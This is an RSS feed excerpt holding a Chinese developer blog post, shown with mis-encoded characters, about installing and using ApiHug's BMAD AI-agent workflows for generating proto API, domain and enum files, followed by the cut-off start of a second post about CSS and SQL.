<link>https://juejin.cn/post/7590503651116335154</link>    <guid>https://juejin.cn/post/7590503651116335154</guid>    <pubDate>2026-01-02T09:15:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590503651116335154" data-draft-id="7590021144779817006" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="èŠ±è´¹äº†è¿‘ $100 æˆ‘å°†ApiHug Vibe ç¼–ç¨‹æ¨¡å¼è·‘é€šäº†"/> <meta itemprop="keywords" content="æ¶æ„,API"/> <meta itemprop="datePublished" content="2026-01-02T09:15:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dearxue"/> <meta itemprop="url" content="https://juejin.cn/user/360295546759800"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            èŠ±è´¹äº†è¿‘ $100 æˆ‘å°†ApiHug Vibe ç¼–ç¨‹æ¨¡å¼è·‘é€šäº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/360295546759800/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dearxue
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:15:04.000Z" title="Fri Jan 02 2026 09:15:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èŠ±è´¹äº†è¿‘ <code>$100</code> æˆ‘å°†ApiHug Vibe ç¼–ç¨‹æ¨¡å¼è·‘é€šäº†ã€‚</h2>
<p>ApiHug è§„èŒƒçš„ AI é©±åŠ¨æ•æ·å¼€å‘æ–¹æ³•è®ºæ˜¯åŸºäº<strong>BMAD</strong> (Breakthrough Method for Agile AI Driven Development)ï¼Œé€šè¿‡ <strong>Agents</strong>ï¼ˆæ™ºèƒ½ä»£ç†ï¼‰å’Œ <strong>Workflows</strong>ï¼ˆå·¥ä½œæµï¼‰å®ç°ä»éœ€æ±‚åˆ°ä»£ç çš„è‡ªåŠ¨åŒ–ç”Ÿæˆã€‚</p>
<p><strong>æ ¸å¿ƒèƒ½åŠ›</strong>:</p>
<ul>
<li>è‡ªåŠ¨ç”Ÿæˆ Proto æ–‡ä»¶ï¼ˆAPI/Domain/Enumï¼‰</li>
<li>ç«¯åˆ°ç«¯å¼€å‘æµç¨‹è‡ªåŠ¨åŒ–</li>
<li>ä»£ç è§„èŒƒå®¡æŸ¥ä¸ä¼˜åŒ–å»ºè®®</li>
<li>åŸºäºè§„èŒƒçš„ Service å±‚å®ç°</li>
</ul>
<p><strong>å‰ç½®æ¡ä»¶</strong>: å¿…é¡»å…ˆå®‰è£… <a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Ftool%2Fapihug-repl" target="_blank" title="https://apihug.github.io/zhCN-docs/tool/apihug-repl" ref="nofollow noopener noreferrer">ApiHug REPL</a></p>
<h3 data-id="heading-1">ä¸€ã€å®‰è£…é…ç½®</h3>
<h4 data-id="heading-2">1.1 å®‰è£…æ­¥éª¤</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">1. å¯åŠ¨ REPL</span>
./apihug
<span class="hljs-meta prompt_">
# </span><span class="bash">2. æ‰§è¡Œå®‰è£…å‘½ä»¤</span>
<span class="hljs-meta prompt_">apihug&gt; </span><span class="bash">install</span>
</code></pre>
<p><strong>å¼•å¯¼å¼å®‰è£…æµç¨‹</strong>:</p>
<ol>
<li>é€‰æ‹©å®‰è£…ç›®å½•ï¼ˆé»˜è®¤å½“å‰ç›®å½•ï¼‰</li>
<li>é€‰æ‹© IDE ç±»å‹ï¼ˆCursor/Codex/Windsurf ç­‰ï¼‰</li>
<li>é…ç½® TTSï¼ˆè¯­éŸ³åˆæˆï¼Œå¯é€‰ï¼‰</li>
<li>å®‰è£…æ ¸å¿ƒ Agents å’Œ Workflows</li>
<li>ç”Ÿæˆ IDE é…ç½®æ–‡ä»¶</li>
</ol>
<h4 data-id="heading-3">1.2 å®‰è£…å‘½ä»¤è¯¦è§£</h4>
<pre><code class="hljs language-shell" lang="shell">install --help

NAME
  install - Install or update BMAD core agents and tools

SYNOPSIS
  install [OPTIONS]

OPTIONS
  --directory &lt;String&gt;
    å®‰è£…ç›®å½•è·¯å¾„
    [é»˜è®¤: . (å½“å‰ç›®å½•)]

  --quick-update &lt;boolean&gt;
    å¿«é€Ÿæ›´æ–°æ¨¡å¼ï¼ˆä¿ç•™ç°æœ‰é…ç½®ï¼‰
    [é»˜è®¤: false]

  --compile-agents &lt;boolean&gt;
    ä»…é‡æ–°ç¼–è¯‘ Agentsï¼ˆä¸ä¿®æ”¹é…ç½®ï¼‰
    [é»˜è®¤: false]

  --modify &lt;boolean&gt;
    ä¿®æ”¹ç°æœ‰ BMAD å®‰è£…
    [é»˜è®¤: false]

  --enable-tts &lt;boolean&gt;
    å¯ç”¨ TTS è¯­éŸ³åˆæˆ
    [é»˜è®¤: false]

  --ides &lt;String&gt;
    æŒ‡å®š IDE åˆ—è¡¨ï¼ˆé€—å·åˆ†éš”ï¼‰
    æ”¯æŒ: cursor,codex,windsurf,claude
    [ç¤ºä¾‹: --ides cursor,codex]
</code></pre>
<p><strong>å¸¸ç”¨å®‰è£…åœºæ™¯</strong>:</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®Œæ•´å®‰è£…ï¼ˆäº¤äº’å¼ï¼‰</span>
install
<span class="hljs-meta prompt_">
# </span><span class="bash">æŒ‡å®šç›®å½•å’Œ IDE</span>
install --directory ~/projects/my-api --ides cursor
<span class="hljs-meta prompt_">
# </span><span class="bash">å¿«é€Ÿæ›´æ–°ï¼ˆä¿ç•™é…ç½®ï¼‰</span>
install --quick-update true
<span class="hljs-meta prompt_">
# </span><span class="bash">ä»…é‡æ–°ç¼–è¯‘ Agents</span>
install --compile-agents true
</code></pre>
<hr/>
<h3 data-id="heading-4">äºŒã€Workflowsï¼ˆå·¥ä½œæµï¼‰</h3>
<h4 data-id="heading-5">2.1 å¯ç”¨ Workflows</h4>






























<table><thead><tr><th>Workflow è·¯å¾„</th><th>åŠŸèƒ½æè¿°</th><th>ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><code>/bmad:bmw:workflows:apihug-proto-design</code></td><td>Proto è®¾è®¡å·¥ä½œæµ</td><td>æ ¹æ®éœ€æ±‚è‡ªåŠ¨ç”Ÿæˆ API/Domain/Enum proto æ–‡ä»¶</td></tr><tr><td><code>/bmad:bmw:workflows:apihug-end-to-end</code></td><td>ç«¯åˆ°ç«¯å¼€å‘æµç¨‹</td><td>ä»éœ€æ±‚åˆ†æåˆ°ä»£ç å®ç°çš„å®Œæ•´æµç¨‹</td></tr><tr><td><code>/bmad:bmw:workflows:apihug-project-review</code></td><td>é¡¹ç›®å®¡æŸ¥å·¥ä½œæµ</td><td>ä»£ç è§„èŒƒæ£€æŸ¥ã€æ¶æ„ä¼˜åŒ–å»ºè®®</td></tr><tr><td><code>/bmad:bmw:workflows:apihug-app-implement</code></td><td>åº”ç”¨å®ç°å·¥ä½œæµ</td><td>åŸºäº proto ç”Ÿæˆ Service å±‚ä¸šåŠ¡ä»£ç </td></tr></tbody></table>
<h4 data-id="heading-6">2.2 Workflow ä½¿ç”¨ç¤ºä¾‹</h4>
<h5 data-id="heading-7">Proto è®¾è®¡å·¥ä½œæµ</h5>
<p><strong>è§¦å‘æ–¹å¼</strong>: åœ¨ IDE ä¸­è¾“å…¥ <code>/bmad:bmw:workflows:apihug-proto-design</code></p>
<p><strong>è¾“å…¥</strong>:</p>
<pre><code class="hljs language-diff" lang="diff">éœ€æ±‚ï¼šç”¨æˆ·ç®¡ç†æ¨¡å—
<span class="hljs-deletion">- éœ€è¦ç”¨æˆ·æ³¨å†Œæ¥å£</span>
<span class="hljs-deletion">- éœ€è¦ç”¨æˆ·ç™»å½•æ¥å£</span>
<span class="hljs-deletion">- éœ€è¦ç”¨æˆ·ä¿¡æ¯æŸ¥è¯¢æ¥å£</span>
<span class="hljs-deletion">- ç”¨æˆ·çŠ¶æ€åŒ…æ‹¬ï¼šæ¿€æ´»ã€ç¦ç”¨ã€åˆ é™¤</span>
</code></pre>
<p><strong>è¾“å‡º</strong>:</p>
<pre><code class="hljs language-proto" lang="proto">// è‡ªåŠ¨ç”Ÿæˆ API å±‚
service UserService {
  option (hope.swagger.svc) = {path: "/user"};
  
  rpc Register(RegisterRequest) returns (UserResponse) {...}
  rpc Login(LoginRequest) returns (TokenResponse) {...}
  rpc GetUser(GetUserRequest) returns (UserResponse) {...}
}

// è‡ªåŠ¨ç”Ÿæˆ Domain å±‚
message UserEntity {
  option (hope.persistence.table) = {
    name: "USER",
    wires: [IDENTIFIABLE, AUDITABLE]
  };
  // ...
}

// è‡ªåŠ¨ç”Ÿæˆ Enum å±‚
enum UserStatus {
  ACTIVE = 0 [(hope.constant.field) = {code: 1, message: "Active"}];
  DISABLED = 1 [(hope.constant.field) = {code: 2, message: "Disabled"}];
  DELETED = 2 [(hope.constant.field) = {code: 3, message: "Deleted"}];
}
</code></pre>
<h5 data-id="heading-8">ç«¯åˆ°ç«¯å¼€å‘æµç¨‹</h5>
<p><strong>é€‚ç”¨åœºæ™¯</strong>: å®Œæ•´åŠŸèƒ½æ¨¡å—å¼€å‘</p>
<p><strong>æµç¨‹æ­¥éª¤</strong>:</p>
<ol>
<li>éœ€æ±‚åˆ†æ â†’ ç”Ÿæˆ proto å®šä¹‰</li>
<li>ç”Ÿæˆæ•°æ®åº“è¡¨ç»“æ„ï¼ˆLiquibaseï¼‰</li>
<li>ç”Ÿæˆ API æ¥å£ä»£ç </li>
<li>ç”Ÿæˆ Service å±‚éª¨æ¶</li>
<li>ç”Ÿæˆå•å…ƒæµ‹è¯•æ¨¡æ¿</li>
</ol>
<h5 data-id="heading-9">é¡¹ç›®å®¡æŸ¥å·¥ä½œæµ</h5>
<p><strong>æ£€æŸ¥é¡¹</strong>:</p>
<ul>
<li>âœ… Proto æ–‡ä»¶æ˜¯å¦ç¬¦åˆ ApiHug è§„èŒƒ</li>
<li>âœ… æ˜¯å¦å­˜åœ¨è·¨å±‚å¼•ç”¨ï¼ˆAPI â†” Domainï¼‰</li>
<li>âœ… æšä¸¾å®šä¹‰æ˜¯å¦å®Œæ•´ï¼ˆcode/message/message2ï¼‰</li>
<li>âœ… æ˜¯å¦ä½¿ç”¨äº†åºŸå¼ƒçš„ Wrapper ç±»å‹</li>
<li>âœ… æƒé™é…ç½®æ˜¯å¦åˆç†</li>
</ul>
<hr/>
<h3 data-id="heading-10">ä¸‰ã€Agentsï¼ˆæ™ºèƒ½ä»£ç†ï¼‰</h3>
<h4 data-id="heading-11">3.1 ApiHug Agent</h4>
<p><strong>è·¯å¾„</strong>: <code>/bmad:bmw:agents:apihug</code></p>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>äº¤äº’å¼ Proto æ–‡ä»¶ç¼–å†™è¾…åŠ©</li>
<li>å®æ—¶è§„èŒƒæ£€æŸ¥å’Œå»ºè®®</li>
<li>è‡ªåŠ¨è¡¥å…¨å’Œé”™è¯¯ä¿®æ­£</li>
<li>åŸºäºä¸Šä¸‹æ–‡çš„ä»£ç ç”Ÿæˆ</li>
</ul>
<p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown">User: å¸®æˆ‘åˆ›å»ºä¸€ä¸ªè®¢å•ç®¡ç†çš„ API

Agent: æˆ‘å°†ä¸ºæ‚¨åˆ›å»ºè®¢å•ç®¡ç† APIï¼ŒåŒ…å«ä»¥ä¸‹å†…å®¹ï¼š

<span class="hljs-bullet">1.</span> Service å®šä¹‰ï¼ˆOrderServiceï¼‰
<span class="hljs-bullet">2.</span> è¯·æ±‚/å“åº”æ¶ˆæ¯ï¼ˆCreateOrderRequest/OrderResponseï¼‰
<span class="hljs-bullet">3.</span> è®¢å•çŠ¶æ€æšä¸¾ï¼ˆOrderStatusï¼‰
<span class="hljs-bullet">4.</span> è®¢å•å®ä½“ï¼ˆOrderEntityï¼‰

æ˜¯å¦éœ€è¦åŒ…å«ä»¥ä¸‹åŠŸèƒ½ï¼Ÿ
<span class="hljs-bullet">-</span> è®¢å•åˆ›å»º
<span class="hljs-bullet">-</span> è®¢å•æŸ¥è¯¢
<span class="hljs-bullet">-</span> è®¢å•å–æ¶ˆ
<span class="hljs-bullet">-</span> è®¢å•çŠ¶æ€æ›´æ–°

User: æ˜¯çš„ï¼Œå…¨éƒ¨åŒ…å«

Agent: [è‡ªåŠ¨ç”Ÿæˆå®Œæ•´çš„ proto æ–‡ä»¶]
</code></pre>
<hr/>
<h3 data-id="heading-12">å››ã€Spec-Driven å¼€å‘è§„èŒƒ</h3>
<p>BMAD åŸºäº ApiHug ä¸‰å±‚è§„èŒƒä½“ç³»ï¼Œç¡®ä¿ç”Ÿæˆä»£ç çš„ä¸€è‡´æ€§å’Œå‡†ç¡®æ€§ã€‚</p>
<h4 data-id="heading-13">4.1 æ ¸å¿ƒè§„èŒƒæ–‡æ¡£</h4>

























<table><thead><tr><th>è§„èŒƒ</th><th>ä½œç”¨åŸŸ</th><th>æ–‡æ¡£é“¾æ¥</th></tr></thead><tbody><tr><td><strong>API æŒ‡ä»¤è§„èŒƒ</strong></td><td>Service/Method/Message/Field</td><td><a href="/zhCN-docs/spec/swagger" target="_blank" title="/zhCN-docs/spec/swagger">æŸ¥çœ‹è¯¦æƒ…</a></td></tr><tr><td><strong>æ•°æ®åº“æŒ‡ä»¤è§„èŒƒ</strong></td><td>Entity/Column</td><td><a href="/zhCN-docs/spec/domain" target="_blank" title="/zhCN-docs/spec/domain">æŸ¥çœ‹è¯¦æƒ…</a></td></tr><tr><td><strong>æšä¸¾ç±»å‹è§„èŒƒ</strong></td><td>Enum/EnumValue</td><td><a href="/zhCN-docs/spec/constant" target="_blank" title="/zhCN-docs/spec/constant">æŸ¥çœ‹è¯¦æƒ…</a></td></tr></tbody></table>
<h4 data-id="heading-14">4.2 è§„èŒƒå¼ºåˆ¶çº¦æŸ</h4>
<p><strong>ç¦æ­¢è·¨å±‚å¼•ç”¨</strong>:</p>
<pre><code class="hljs language-proto" lang="proto">// âŒ é”™è¯¯ï¼šAPI å±‚å¼•ç”¨ Domain å±‚
import "com/example/domain/entities/user.proto";

// âœ… æ­£ç¡®ï¼šAPI å±‚å¼•ç”¨ Infra å±‚æšä¸¾
import "com/example/infra/constants/user_constant.proto";
</code></pre>
<p><strong>ç¦æ­¢ Wrapper ç±»å‹</strong>:</p>
<pre><code class="hljs language-proto" lang="proto">// âŒ é”™è¯¯
google.protobuf.Int32Value user_id = 1;

// âœ… æ­£ç¡®
int32 user_id = 1;
</code></pre>
<hr/>
<h3 data-id="heading-15">äº”ã€æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-16">5.1 Workflow é€‰æ‹©æŒ‡å—</h4>
<pre><code class="hljs language-vbnet" lang="vbnet">æ–°åŠŸèƒ½å¼€å‘ â†’ apihug-<span class="hljs-keyword">end</span>-<span class="hljs-keyword">to</span>-<span class="hljs-keyword">end</span>
ä»…è®¾è®¡ API â†’ apihug-proto-design
ä»£ç é‡æ„ â†’ apihug-project-review
ä¸šåŠ¡é€»è¾‘å®ç° â†’ apihug-app-implement
äº¤äº’å¼ç¼–å†™ â†’ apihug agent
</code></pre>
<h4 data-id="heading-17">5.2 å¸¸è§é—®é¢˜</h4>
<p><strong>Q1</strong>: Workflow ç”Ÿæˆçš„ä»£ç ä¸ç¬¦åˆé¢„æœŸï¼Ÿ
<strong>A1</strong>: ä½¿ç”¨ <code>apihug-project-review</code> å®¡æŸ¥ï¼Œæ ¹æ®å»ºè®®è°ƒæ•´</p>
<p><strong>Q2</strong>: å¦‚ä½•è‡ªå®šä¹‰ Workflow è¡Œä¸ºï¼Ÿ
<strong>A2</strong>: ä½¿ç”¨ <code>install --modify true</code> ä¿®æ”¹é…ç½®</p>
<p><strong>Q3</strong>: æ”¯æŒå“ªäº› IDEï¼Ÿ
<strong>A3</strong>: Cursor, Codex, Windsurf, Claude Desktop ç­‰æ”¯æŒ MCP çš„ IDE</p>
<hr/>
<h3 data-id="heading-18">å…­ã€å‡çº§ä¸ç»´æŠ¤</h3>
<h4 data-id="heading-19">6.1 ç‰ˆæœ¬æ›´æ–°</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å¿«é€Ÿæ›´æ–°ï¼ˆä¿ç•™é…ç½®ï¼‰</span>
<span class="hljs-meta prompt_">apihug&gt; </span><span class="bash">install --quick-update <span class="hljs-literal">true</span></span>
<span class="hljs-meta prompt_">
# </span><span class="bash">å®Œæ•´é‡è£…</span>
<span class="hljs-meta prompt_">apihug&gt; </span><span class="bash">install --modify <span class="hljs-literal">true</span></span>
</code></pre>
<h4 data-id="heading-20">6.2 é‡æ–°ç¼–è¯‘ Agents</h4>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">ä»…é‡æ–°ç¼–è¯‘ Agentsï¼ˆé…ç½®ä¸å˜ï¼‰</span>
<span class="hljs-meta prompt_">apihug&gt; </span><span class="bash">install --compile-agents <span class="hljs-literal">true</span></span>
</code></pre>
<h3 data-id="heading-21">å‚è€ƒ</h3>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Fspec" target="_blank" title="https://apihug.github.io/zhCN-docs/spec" ref="nofollow noopener noreferrer">ApiHug 2.0 LLM ä¼˜åŒ–è§„èŒƒ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Ftool%2Fapihug-bmad" target="_blank" title="https://apihug.github.io/zhCN-docs/tool/apihug-bmad" ref="nofollow noopener noreferrer">ApiHug BMAD</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Fspec%2Fswagger" target="_blank" title="https://apihug.github.io/zhCN-docs/spec/swagger" ref="nofollow noopener noreferrer">API æŒ‡ä»¤è§„èŒƒ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Fspec%2Fdomain" target="_blank" title="https://apihug.github.io/zhCN-docs/spec/domain" ref="nofollow noopener noreferrer">æ•°æ®åº“æŒ‡ä»¤è§„èŒƒ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fapihug.github.io%2FzhCN-docs%2Fspec%2Fconstant" target="_blank" title="https://apihug.github.io/zhCN-docs/spec/constant" ref="nofollow noopener noreferrer">æšä¸¾ç±»å‹è§„èŒƒ</a></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS å†™ SQL æŸ¥è¯¢ï¼Ÿåç«¯æ…Œäº†ï¼]]></title>    <link>https://juejin.cn/post/7589932422654443556</link>    <guid>https://juejin.cn/post/7589932422654443556</guid>    <pubDate>2026-01-02T09:09:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654443556" data-draft-id="7589932422654427172" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS å†™ SQL æŸ¥è¯¢ï¼Ÿåç«¯æ…Œäº†ï¼"/> <meta itemprop="keywords" content="SQL,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-02T09:09:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°å°è§"/> <meta itemprop="url" content="https://juejin.cn/user/606586151371054"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS å†™ SQL æŸ¥è¯¢ï¼Ÿåç«¯æ…Œäº†ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/606586151371054/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°å°è§
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T09:09:05.000Z" title="Fri Jan 02 2026 09:09:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 